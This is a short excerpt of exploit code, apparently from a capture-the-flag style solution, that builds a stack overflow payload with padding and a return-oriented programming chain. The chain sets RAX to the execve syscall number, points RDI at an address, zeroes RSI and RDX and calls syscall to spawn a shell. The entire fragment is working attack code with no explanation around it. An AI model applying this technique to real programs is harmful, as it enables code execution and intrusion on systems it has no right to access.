...
payload += "AAAAAAAA"
 ...
 # ROP CHAIN
payload += "\x87\x01\x40\x00\x00\x00\x00\x00" 		# RAX
payload += "\x3b" + "\x00" * 7

payload += "\x89\x01\x40\x00\x00\x00\x00\x00" 		# RDI
payload += "\x8f\x01\x40\x00\x00\x00\x00\x00" 		# 0x40018f

payload += "\x8b\x01\x40\x00\x00\x00\x00\x00" 		# RSI
payload += "\x00" * 8

payload += "\x8d\x01\x40\x00\x00\x00\x00\x00" 		# RDX
payload += "\x00" * 8

payload += "\x84\x01\x40\x00\x00\x00\x00\x00" 		# syscall
